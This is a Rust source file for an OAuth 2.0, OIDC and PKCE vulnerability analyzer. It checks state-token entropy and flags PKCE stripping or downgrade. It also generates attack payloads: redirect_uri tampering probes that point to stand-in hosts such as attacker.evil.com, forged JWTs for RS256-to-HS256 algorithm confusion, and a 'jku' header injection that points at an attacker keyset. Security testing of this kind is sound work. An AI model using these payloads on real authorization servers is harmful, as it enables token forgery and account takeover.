//! OAuth 2.0, OpenID Connect (OIDC) & PKCE Flow Analyzer
//!
//! Evaluates authorization endpoints and token exchange flows for common vulnerabilities:
//! - redirect_uri validation flaws (open redirects, path traversal, parameter pollution)
//! - state parameter entropy and CSRF token omission
//! - PKCE downgrade attacks (S256 to plain, stripping code_verifier)
//! - JWT Algorithm Confusion (RS256 to HS256) and JWKS parameter injection

use base64::engine::general_purpose::URL_SAFE_NO_PAD;
use base64::Engine;
use serde::{Deserialize, Serialize};
use serde_json::Value;

#[derive(Debug, Clone, PartialEq, Eq, Serialize, Deserialize)]
pub enum OAuthVulnerabilityType {
    RedirectUriOpenRedirect,
    RedirectUriPathTraversal,
    RedirectUriParameterPollution,
    MissingStateParameter,
    StaticStateParameter,
    LowEntropyStateParameter,
    PkceDowngradeAllowed,
    PkceStrippingAllowed,
    JwtAlgorithmConfusion,
    JwksHeaderInjection,
}

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct OAuthVulnerability {
    pub vuln_type: OAuthVulnerabilityType,
    pub title: String,
    pub description: String,
    pub severity: String,
    pub remediation: String,
}

pub struct OAuthFlowAnalyzer;

impl OAuthFlowAnalyzer {
    /// Calculate Shannon entropy in bits per character: - sum(p * log2(p))
    pub fn shannon_entropy(input: &str) -> f64 {
        if input.is_empty() {
            return 0.0;
        }

        let mut freq = [0usize; 256];
        for b in input.as_bytes() {
            freq[*b as usize] += 1;
        }

        let len = input.len() as f64;
        let mut entropy = 0.0;
        for &count in &freq {
            if count > 0 {
                let p = count as f64 / len;
                entropy -= p * p.log2();
            }
        }
        entropy
    }

    /// Generates redirect_uri tampering test cases from a legitimate registered redirect URI
    pub fn generate_redirect_uri_probes(legitimate_uri: &str) -> Vec<(String, &'static str)> {
        let mut probes = Vec::new();

        // 1. Path traversal escape
        probes.push((
            format!("{}/../../attacker_callback", legitimate_uri.trim_end_matches('/')),
            "Path traversal injection to escape allowed path",
        ));

        // 2. Open redirect via parameter append
        probes.push((
            format!("{}?next=https://attacker.evil.com", legitimate_uri),
            "Open redirect via appended destination parameter",
        ));

        // 3. Subdomain hijack / regex prefix bypass
        if let Ok(parsed) = url::Url::parse(legitimate_uri) {
            if let Some(host) = parsed.host_str() {
                probes.push((
                    format!("https://{}.attacker.evil.com/callback", host),
                    "Domain prefix regex bypass to attacker subdomain",
                ));
                probes.push((
                    format!("https://attacker-evil-{}/callback", host),
                    "Domain suffix bypass",
                ));
            }
        }

        // 4. Fragment parameter pollution
        probes.push((
            format!("{}#@attacker.evil.com", legitimate_uri),
            "URL fragment delimiter confusion",
        ));

        probes
    }

    /// Analyzes a collection of observed OAuth 'state' parameter values for randomness and entropy
    pub fn analyze_state_parameter(observed_states: &[String]) -> Vec<OAuthVulnerability> {
        let mut vulns = Vec::new();

        if observed_states.is_empty() {
            return vulns;
        }

        // Check for completely missing or empty state
        if observed_states.iter().any(|s| s.is_empty()) {
            vulns.push(OAuthVulnerability {
                vuln_type: OAuthVulnerabilityType::MissingStateParameter,
                title: "Missing OAuth State Parameter".to_string(),
                description: "The OAuth authorization request does not mandate a state CSRF token.".to_string(),
                severity: "HIGH".to_string(),
                remediation: "Enforce cryptographically random, unguessable state parameter per RFC 6749 §10.12.".to_string(),
            });
        }

        // Check for static/constant state parameter across multiple logins
        if observed_states.len() >= 2 && observed_states.iter().all(|s| s == &observed_states[0]) {
            vulns.push(OAuthVulnerability {
                vuln_type: OAuthVulnerabilityType::StaticStateParameter,
                title: "Static OAuth State Parameter".to_string(),
                description: "Observed identical state parameter values across multiple distinct authentication sessions.".to_string(),
                severity: "HIGH".to_string(),
                remediation: "Generate a fresh, cryptographically bound random state token for each authorization flow.".to_string(),
            });
        }

        // Check Shannon entropy of the state tokens
        for state in observed_states {
            let entropy = Self::shannon_entropy(state);
            let total_bits = entropy * state.len() as f64;
            if total_bits < 64.0 && !state.is_empty() {
                vulns.push(OAuthVulnerability {
                    vuln_type: OAuthVulnerabilityType::LowEntropyStateParameter,
                    title: "Low Entropy OAuth State Token".to_string(),
                    description: format!("State parameter '{state}' has low total entropy ({total_bits:.1} bits < 64 bits threshold)."),
                    severity: "MEDIUM".to_string(),
                    remediation: "Ensure state token provides at least 128 bits of cryptographic entropy (e.g. 16+ secure random bytes).".to_string(),
                });
                break;
            }
        }

        vulns
    }

    /// Evaluates PKCE security when stripping or downgrading code_challenge
    pub fn evaluate_pkce_vulnerabilities(
        token_exchange_without_verifier_status: u16,
        token_exchange_with_plain_method_status: u16,
    ) -> Vec<OAuthVulnerability> {
        let mut vulns = Vec::new();

        // If server successfully issues token (200 OK) when code_verifier is stripped
        if token_exchange_without_verifier_status == 200 {
            vulns.push(OAuthVulnerability {
                vuln_type: OAuthVulnerabilityType::PkceStrippingAllowed,
                title: "PKCE Code Verifier Stripping Allowed".to_string(),
                description: "The token endpoint issued an access token despite omission of code_verifier for a PKCE authorization code.".to_string(),
                severity: "HIGH".to_string(),
                remediation: "Reject authorization codes issued with code_challenge if code_verifier is missing at token exchange (RFC 7636).".to_string(),
            });
        }

        // If server accepts code_challenge_method=plain
        if token_exchange_with_plain_method_status == 200 {
            vulns.push(OAuthVulnerability {
                vuln_type: OAuthVulnerabilityType::PkceDowngradeAllowed,
                title: "PKCE Plain Downgrade Allowed".to_string(),
                description: "The authorization server permits 'code_challenge_method=plain', exposing code_verifier to authorization request interception.".to_string(),
                severity: "MEDIUM".to_string(),
                remediation: "Enforce code_challenge_method=S256 and reject 'plain' method per OAuth 2.1 specification.".to_string(),
            });
        }

        vulns
    }

    /// Creates an Algorithm Confusion attack token (RS256 -> HS256 signed with RSA public key bytes)
    pub fn create_algorithm_confusion_payload(jwt_str: &str) -> Option<String> {
        // Default using standard RSA public key representation
        let public_key_pem = b"-----BEGIN PUBLIC KEY-----\nMIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEA\n-----END PUBLIC KEY-----";
        crate::jwt::JwtUtility::create_key_confusion_attack(jwt_str, public_key_pem)
    }

    /// Creates an Algorithm Confusion attack token with specified raw public key bytes
    pub fn create_algorithm_confusion_payload_with_key(jwt_str: &str, rsa_public_key_bytes: &[u8]) -> Option<String> {
        crate::jwt::JwtUtility::create_key_confusion_attack(jwt_str, rsa_public_key_bytes)
    }

    /// Creates a JWKS parameter injection attack header (`jku` pointing to attacker keyset)
    pub fn create_jwks_injection_payload(jwt_str: &str, attacker_jwks_url: &str) -> Option<String> {
        let parts: Vec<&str> = jwt_str.split('.').collect();
        if parts.len() != 3 {
            return None;
        }

        let header_bytes = URL_SAFE_NO_PAD.decode(parts[0]).ok()?;
        let mut header: Value = serde_json::from_slice(&header_bytes).ok()?;

        if let Some(map) = header.as_object_mut() {
            map.insert("jku".to_string(), Value::String(attacker_jwks_url.to_string()));
            map.insert("kid".to_string(), Value::String("attacker_key_1".to_string()));
        }

        let new_header_json = serde_json::to_vec(&header).ok()?;
        let new_header_b64 = URL_SAFE_NO_PAD.encode(new_header_json);

        Some(format!("{}.{}.{}", new_header_b64, parts[1], parts[2]))
    }
}
